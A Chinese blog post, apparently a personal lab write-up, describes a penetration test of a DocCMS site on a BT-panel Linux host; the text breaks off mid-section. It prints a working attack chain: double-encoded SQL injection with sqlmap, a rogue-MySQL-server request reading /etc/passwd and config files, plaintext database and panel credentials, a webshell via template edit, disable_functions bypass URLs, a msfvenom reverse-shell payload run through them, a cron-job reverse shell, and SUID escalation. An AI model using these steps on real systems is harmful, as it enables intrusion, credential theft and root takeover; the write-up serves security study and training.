@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>web漏洞@记一次Linux内网渗透测试 - 打渔为生</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=>
+  
+    <meta name="description" content="全平台漏洞挖掘手记">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="打渔为生" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">打渔为生</a>
+    <div class="subtitle">tutucoo的技术笔记</div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">主页</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">关于</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">web漏洞@记一次Linux内网渗透测试</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%86%B5"><span class="toc-text">概况</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E4%B8%BB%E6%9C%BA"><span class="toc-text">攻击主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%911%E5%8F%B7%E6%9C%BA"><span class="toc-text">内网1号机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%912%E5%8F%B7%E6%9C%BA"><span class="toc-text">内网2号机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA"><span class="toc-text">扫描内网主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="toc-text">扫目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF"><span class="toc-text">查看网站信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA"><span class="toc-text">网站搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81"><span class="toc-text">代码审计-二次编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">代码审计-mysql任意文件读取漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%A0%B4%E8%A7%A3%E7%AE%97%E6%B3%95%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0"><span class="toc-text">代码审计-破解算法登陆后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-text">代码审计-后台任意文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91getshell"><span class="toc-text">后台模板编辑getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9D%E5%A1%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-text">宝塔命令执行提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E5%8F%AF%E4%BA%A4%E4%BA%92shell"><span class="toc-text">msf可交互shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%AE%9D%E5%A1%94%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">通过宝塔计划任务反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-text">sudo提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC"><span class="toc-text">Linux内网权限扫描脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LinEnum%E4%BD%BF%E7%94%A8"><span class="toc-text">LinEnum使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-exploit-suggester%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">linux-exploit-suggester的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linuxprivchecker"><span class="toc-text">linuxprivchecker</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-socks5%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-text">Linux socks5内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E4%B8%8A%E4%BC%A0getshell"><span class="toc-text">模板上传getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E7%A9%BF%E9%80%8F%E5%86%85%E7%BD%91"><span class="toc-text">蚁剑穿透内网</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wdcp%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83"><span class="toc-text">wdcp系统提权</span></a></li></ol>
+
+  <div class="post-content">
+    <h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><h3 id="攻击主机"><a href="#攻击主机" class="headerlink" title="攻击主机"></a>攻击主机</h3><p>192.168.0.128</p>
+<h3 id="内网1号机"><a href="#内网1号机" class="headerlink" title="内网1号机"></a>内网1号机</h3><p>内网1号机:192.168.0.122/10.10.10.145  密码：yanisy123</p>
+<p>内网1号设置静态ip</p>
+<p>点击编辑连接 </p>
+<p><img src="https://i.loli.net/2021/10/03/A5IwYGpQl34768U.png" alt="Untitled"></p>
+<p>设置静态ip</p>
+<p><img src="https://i.loli.net/2021/10/03/cSA17vs5Fb3IiWx.png" alt="Untitled"></p>
+<p>两张网卡都设置好以后断开重连</p>
+<p><img src="https://i.loli.net/2021/10/03/OJ4cWzASqEt8NUj.png" alt="Untitled"></p>
+<p>内网1号机根目录下有bt.txt，里面有一个宝塔的后台网址以及用户名密码</p>
+<p><img src="https://i.loli.net/2021/10/03/UgutS9EcbJ5NAMn.png" alt="Untitled"></p>
+<p>直接访问8888端口会跳转到login</p>
+<p><img src="https://i.loli.net/2021/10/03/akprXlV2zcPLD9x.png" alt="Untitled"></p>
+<p>80端口直接访问会提示错误，需要在hosts文件中绑定到<a target="_blank" rel="noopener" href="http://www.ddd4.com,这好像是宝塔的设定,宝塔后台建立了一个网站www.ddd4.com,无法通过ip直接访问,需要访问域名/">www.ddd4.com，这好像是宝塔的设定，宝塔后台建立了一个网站www.ddd4.com，无法通过ip直接访问，需要访问域名</a></p>
+<p><img src="https://i.loli.net/2021/10/03/caoP9yBvWI3e8xA.png" alt="Untitled"></p>
+<h3 id="内网2号机"><a href="#内网2号机" class="headerlink" title="内网2号机"></a>内网2号机</h3><p>内网2号机:10.10.10.144</p>
+<h2 id="扫描内网主机"><a href="#扫描内网主机" class="headerlink" title="扫描内网主机"></a>扫描内网主机</h2><p>nmap发现内网主机，一共两台，分别是192.168.0.122和192.168.0.109，109是攻击机，122是内网1号机</p>
+<p><img src="https://i.loli.net/2021/10/03/w2vZpGCAzDLfsR3.png" alt="Untitled"></p>
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>探1号机端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v <span class="number">192.168</span><span class="number">.0</span><span class="number">.122</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/03/JDqYguBx1RSmbNQ.png" alt="Untitled"></p>
+<h2 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-<span class="built_in">list</span>-<span class="number">2.3</span>-medium.txt -x <span class="string">&#x27;php,html&#x27;</span> -o <span class="built_in">dir</span>.log --wildcard</span><br></pre></td></tr></table></figure>
+<p>用上面的指令进行扫描时会有很多响应是200，但是长度是一样的，这都是错误页，要将它们过滤掉</p>
+<p><img src="https://i.loli.net/2021/10/03/KNvcbo9AS18IWJs.png" alt="Untitled"></p>
+<p>过滤语句</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-<span class="built_in">list</span>-<span class="number">2.3</span>-medium.txt -x <span class="string">&#x27;php,html&#x27;</span> -o <span class="built_in">dir</span>.log --wildcard | grep -v <span class="string">&quot;Size: 11807&quot;</span>|grep -v <span class="string">&quot;Size:49&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="查看网站信息"><a href="#查看网站信息" class="headerlink" title="查看网站信息"></a>查看网站信息</h2><p>用whatweb查看网站信息 ，不同的域名返回的信息不一样</p>
+<p><img src="https://i.loli.net/2021/10/03/wly4JUdzAWB1ksD.png" alt="Untitled"></p>
+<h2 id="网站搭建"><a href="#网站搭建" class="headerlink" title="网站搭建"></a>网站搭建</h2><p>把ddd4.com的源码下载下来并创建网站进行测试</p>
+<p><img src="https://i.loli.net/2021/10/03/yLBu5qpzl3xmtGf.png" alt="Untitled"></p>
+<p>需要手动在hosts文件中绑定<a target="_blank" rel="noopener" href="http://www.duo1.com或者用同步hosts/">www.duo1.com或者用同步hosts</a></p>
+<p>然后访问<a target="_blank" rel="noopener" href="http://www.duo1.com进行安装,之后就可以访问了/">www.duo1.com进行安装，之后就可以访问了</a></p>
+<h2 id="代码审计-二次编码"><a href="#代码审计-二次编码" class="headerlink" title="代码审计-二次编码"></a>代码审计-二次编码</h2><p>目标是DocCMS，代码审计要多关注过滤规则，看有没有绕过的方法</p>
+<p>看到很多urldecode函数，这里可能存在二次编码注入</p>
+<p><img src="https://i.loli.net/2021/10/03/YZKvMArpwtRWV4h.png" alt="Untitled"></p>
+<p>原文是11111’，对其进行两次url编码，执行后仍然会被解析成11111’</p>
+<p><img src="https://i.loli.net/2021/10/03/YKQzbNkvaE12CTP.png" alt="Untitled"></p>
+<p>有的时候一次编码会被过滤掉，但是二次编码就可以绕过防护</p>
+<p>调用一些过滤函数，看过滤效果</p>
+<p><img src="https://i.loli.net/2021/10/03/d9jMaPfk4uGl1g3.png" alt="Untitled"></p>
+<p>可以看到对单引号进行了过滤</p>
+<p><img src="https://i.loli.net/2021/10/03/UMXdqhkjzANH5I9.png" alt="Untitled"></p>
+<p>如果对payload进行二次编码则可以绕过</p>
+<p><img src="https://i.loli.net/2021/10/03/O4brdawqne9op6I.png" alt="Untitled"></p>
+<p>找到一处地址存在sql注入，这里checkSqlStr可以用二次url编码绕过</p>
+<p><img src="https://i.loli.net/2021/10/03/EGYBcfI54L1hQ2v.png" alt="Untitled"></p>
+<p>这个函数位于content/search/index.php，所以构造如下，确实存在注入</p>
+<p><img src="https://i.loli.net/2021/10/03/X4Hq3uwUYzBDVfS.png" alt="Untitled"></p>
+<p>sqlmap跑一遍，成功跑出数据  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u http://www.ddd4.com/search?keyword=11 --dbms mysql -v 1 --tamper chardoubleencode.py</span><br></pre></td></tr></table></figure>
+<h2 id="代码审计-mysql任意文件读取漏洞"><a href="#代码审计-mysql任意文件读取漏洞" class="headerlink" title="代码审计-mysql任意文件读取漏洞"></a>代码审计-mysql任意文件读取漏洞</h2><p>setup/checkdb.php里面有一段代码，这段代码会导致mysql远程连接任意文件读取漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dbhost&#x27;</span>];</span><br><span class="line"><span class="variable">$uname</span>  = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$pwd</span>	= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$dbname</span>	= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;dbname&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&quot;chkdb&quot;</span>)&#123;</span><br><span class="line">	<span class="variable">$con</span> = @mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$uname</span>,<span class="variable">$pwd</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$rs</span> = mysql_query(<span class="string">&#x27;show databases;&#x27;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_assoc(<span class="variable">$rs</span>))&#123;</span><br><span class="line">		<span class="variable">$data</span>[] = <span class="variable">$row</span>[<span class="string">&#x27;Database&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$rs</span>, <span class="variable">$row</span>);</span><br><span class="line">	mysql_close();</span><br><span class="line">	<span class="keyword">if</span> (in_array(strtolower(<span class="variable">$dbname</span>), <span class="variable">$data</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	   <span class="keyword">echo</span> <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]==<span class="string">&quot;creatdb&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$dbname</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$con</span> = @mysql_connect(<span class="variable">$dbhost</span>,<span class="variable">$uname</span>,<span class="variable">$pwd</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (mysql_query(<span class="string">&quot;CREATE DATABASE <span class="subst">&#123;$dbname&#125;</span> DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci&quot;</span>,<span class="variable">$con</span>))&#123;</span><br><span class="line">	  <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  <span class="keyword">echo</span> mysql_error();</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_close(<span class="variable">$con</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过rogue-mysql-server读取/etc/passwd</p>
+<p><img src="https://i.loli.net/2021/10/03/1tDJyipG5gIlzKd.png" alt="Untitled"></p>
+<p>使用python2.x运行Rogue-MySql-Server服务，运行伪造mysql服务器，等待连接</p>
+<p><img src="https://i.loli.net/2021/10/03/wlCr81MJxY4RZta.png" alt="Untitled"></p>
+<p>访问url触发漏洞,192.168.0.128是攻击机，这里ip进行了更改，为了统一，之后三台主机会分别统称攻击机、内网1号机（1号机）、内网2号机（2号机）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/setup/checkdb.php?dbname=mysql&amp;uname=root&amp;pwd=123456&amp;dbhost=192.168.0.128&amp;action=chkdb</span><br></pre></td></tr></table></figure>
+<p>访问url触发，漏洞触发还导致暴露了根目录</p>
+<p><img src="https://i.loli.net/2021/10/03/VsPIgKqbNeXmGZL.png" alt="Untitled"></p>
+<p>再看mysql.log文件，etc/passwd文件内容已经读取到了</p>
+<p><img src="https://i.loli.net/2021/10/03/GgQjRSUpc64TZre.png" alt="Untitled"></p>
+<p>再根据暴露出来的根目录修改脚本，读取doc-config-cn.php文件内容</p>
+<p><img src="https://i.loli.net/2021/10/03/sDlRuv6N859MYqx.png" alt="Untitled"></p>
+<p>可以看到DB_DBNAME、DB_USER、DB_PASSWORD几个字段，有了这些字段就可以连接到目标数据库了</p>
+<p><img src="https://i.loli.net/2021/10/03/4XRGzOEd89KcBNm.png" alt="Untitled"></p>
+<p>连接目标数据库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192<span class="number">.168</span><span class="number">.0</span><span class="number">.122</span> -uwww_ddd4_com -px4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/03/ed45rguZpG2SxDs.png" alt="Untitled"></p>
+<h2 id="代码审计-破解算法登陆后台"><a href="#代码审计-破解算法登陆后台" class="headerlink" title="代码审计-破解算法登陆后台"></a>代码审计-破解算法登陆后台</h2><p>这里是后台地址</p>
+<p><img src="https://i.loli.net/2021/10/03/LRsYXUEdKgWr82N.png" alt="Untitled"></p>
+<p>找到源码加密算法</p>
+<p><img src="https://i.loli.net/2021/10/03/qpP34yDzgXLcu79.png" alt="Untitled"></p>
+<p>这里可以在根目录创建一个test.php，然后调用这个算法</p>
+<p><img src="https://i.loli.net/2021/10/03/ncdLmiJRDAjEGaF.png" alt="Untitled"></p>
+<p>admin加密后是33e2…</p>
+<p><img src="https://i.loli.net/2021/10/03/BjkXYWa9uclb2PG.png" alt="Untitled"></p>
+<p>前面已经拿到数据库权限，因此可以修改admin用户名的密码为33e2….，然后就可以通过admin/admin登陆后台了</p>
+<p><img src="https://i.loli.net/2021/10/03/27R3NqxLhugoGIO.png" alt="Untitled"></p>
+<h2 id="代码审计-后台任意文件上传漏洞"><a href="#代码审计-后台任意文件上传漏洞" class="headerlink" title="代码审计-后台任意文件上传漏洞"></a>代码审计-后台任意文件上传漏洞</h2><p>admini\controllers\system\bakup.php</p>
+<p><img src="https://i.loli.net/2021/10/03/fwS2Kti7UgOmpEB.png" alt="Untitled"></p>
+<p>这里过滤了后缀名，不过即使后缀名检测不通过，没有退出机制，文件依然会被上传 </p>
+<p>随便找个上传点测一下参数m表示控制器名称，参数s表示文件名，参数a表示方法名</p>
+<p><img src="https://i.loli.net/2021/10/03/gxub7UceLFZCGMv.png" alt="Untitled"></p>
+<p>把路径修改为uploadsql的路径进行上传，虽然返回错误提示不过在后台可以看到文件已经上传了</p>
+<p><img src="https://i.loli.net/2021/10/03/S8tEyX69GDdlF45.png" alt="Untitled"></p>
+<p><img src="https://i.loli.net/2021/10/03/9h4d2YVrQnZDuKl.png" alt="Untitled"></p>
+<p>不过.htaccess文件禁止了temp目录的访问，因此无法getshell</p>
+<p><img src="https://i.loli.net/2021/10/03/oHQjl7rBXNqdnbt.png" alt="Untitled"></p>
+<h2 id="后台模板编辑getshell"><a href="#后台模板编辑getshell" class="headerlink" title="后台模板编辑getshell"></a>后台模板编辑getshell</h2><p>在后台模板中编辑，插入一句话，重新应用一下模板</p>
+<p><img src="https://i.loli.net/2021/10/03/qwykj7QGzSAVmDN.png" alt="Untitled"></p>
+<p>一句话是插入到首页上面的，所以菜刀连接首页</p>
+<p><img src="https://i.loli.net/2021/10/03/XvtEsCB3FMeAg5m.png" alt="Untitled"></p>
+<p>直接getshell </p>
+<p><img src="https://i.loli.net/2021/10/03/fs3hLtg2bjRkFE4.png" alt="Untitled"></p>
+<h2 id="宝塔命令执行提权"><a href="#宝塔命令执行提权" class="headerlink" title="宝塔命令执行提权"></a>宝塔命令执行提权</h2><p>上面通过模板编辑拿到的shell不能执行命令</p>
+<p><img src="https://i.loli.net/2021/10/03/WZo93aLSxbQNzdl.png" alt="Untitled"></p>
+<p>上传bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so到根目录，然后通过下面的payload执行ifconfig命令，这样可以绕过宝塔对命令执行的限制 </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.ddd4.com/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/03/EcpxSRqBidZJ6te.png" alt="Untitled"></p>
+<h2 id="msf可交互shell"><a href="#msf可交互shell" class="headerlink" title="msf可交互shell"></a>msf可交互shell</h2><p>既然已经getshell也可以执行命令了，就可以尝试上传个反向shell，创建一个可交互式的shell</p>
+<p>首先生成反向shell程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.0</span><span class="number">.128</span> LPORT=<span class="number">13777</span> -f elf &gt; ddd4</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/03/O3KofIvtJ74h6DS.png" alt="Untitled"></p>
+<p>先通过菜刀把反向shell程序上传到根目录，然后对反向shell程序进行提权，默认没有执行权限，这里提权就用上了刚才用的宝塔命令执行绕过脚本</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=chmod%20777%20ddd4&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p>现在有了执行权限</p>
+<p><img src="https://i.loli.net/2021/10/03/azTAhC4MFrd6Z7c.png" alt="Untitled"></p>
+<p>msf进行监听</p>
+<p><img src="https://i.loli.net/2021/10/03/3tY2mhHoJCjafPW.png" alt="Untitled"></p>
+<p>执行ddd4</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=./ddd4&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p>msf反弹shell成功 </p>
+<p><img src="https://i.loli.net/2021/10/03/XCRA3N7ajg4ukmr.png" alt="Untitled"></p>
+<p>为了更方便的操作，在msf里面可以切换shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/10/03/DWrCstMVaZ2fwH6.png" alt="Untitled"></p>
+<h2 id="通过宝塔计划任务反弹shell"><a href="#通过宝塔计划任务反弹shell" class="headerlink" title="通过宝塔计划任务反弹shell"></a>通过宝塔计划任务反弹shell</h2><p>桌面存在文件bt.txt，里面有宝塔后台的ip和用户名密码</p>
+<p>ip：<a target="_blank" rel="noopener" href="http://192.168.0.122:8888/944906b5/">http://192.168.0.122:8888/944906b5/</a></p>
+<p>用户名：gpeqnjf4</p>
+<p>密码：d12924fa</p>
+<p><img src="https://i.loli.net/2021/10/03/cBwQEVvfTtk6iXF.png" alt="Untitled"></p>
+<p>找到创建计划任务的地方创建一个计划任务</p>
+<p><img src="https://i.loli.net/2021/10/03/xPenoishYSwfT8A.png" alt="Untitled"></p>
+<p>本机监听，准备反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">9001</span></span><br></pre></td></tr></table></figure>
+<p>手动执行任务，反弹shell成功</p>
+<p><img src="https://i.loli.net/2021/10/03/cAM7jDVfHdv1bEo.png" alt="Untitled"></p>
+<p>权限是root</p>
+<p><img src="https://i.loli.net/2021/10/03/te9VSM1lchWYwXr.png" alt="Untitled"></p>
+<p>上一个部分，我们上传了一个反向shell程序ddd4到内网1号机，但是它的权限不够，可以利用这里的root权限对刚才的反向shell程序进行提权</p>
+<p>这里getshell连接上之后进入根目录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br></pre></td></tr></table></figure>
+<p>然后再cd到www\wwwroot\<a target="_blank" rel="noopener" href="http://www.ddd4.com目录,执行ddd4执行,此时ddd4是root权限/">www.ddd4.com目录，执行ddd4执行，此时ddd4是root权限</a></p>
+<p>本地msf开启监听，反弹shell之后权限是root</p>
+<p><img src="https://i.loli.net/2021/10/03/ltNcA3B45QLyqHf.png" alt="Untitled"></p>
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>执行下面命令搜索到有guid权限的程序  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>利用find程序进行提权</p>
+<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>sudo提权需要知道密码，可以通过一些linux信息收集工具收集到历史记录文件等，也许可以找到密码</p>
+<h2 id="Linux内网权限扫描脚本"><a href="#Linux内网权限扫描脚本" class="headerlink" title="Linux内网权限扫描脚本"></a>Linux内网权限扫描脚本</h2><h3 id="LinEnum使用"><a href="#LinEnum使用" class="headerlink" title="LinEnum使用"></a>LinEnum使用</h3><p>github下载后，直接运行LinEnum.sh程序就可以了，如果要在远程主机上使用可以先在本机创建一个http服务器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>
+<p>http服务器是在哪个目录开启的，哪里就是根目录</p>
+<p>在目标机中进行下载</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="number">192.168</span><span class="number">.0</span><span class="number">.128</span>/LinEnum.sh</span><br></pre></td></tr></table></figure>
+<p>在目标机上执行发现权限不足，可以利用suid提权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir testfind test -<span class="built_in">exec</span> chmod <span class="number">777</span> ./LinEnum.sh \;</span><br></pre></td></tr></table></figure>
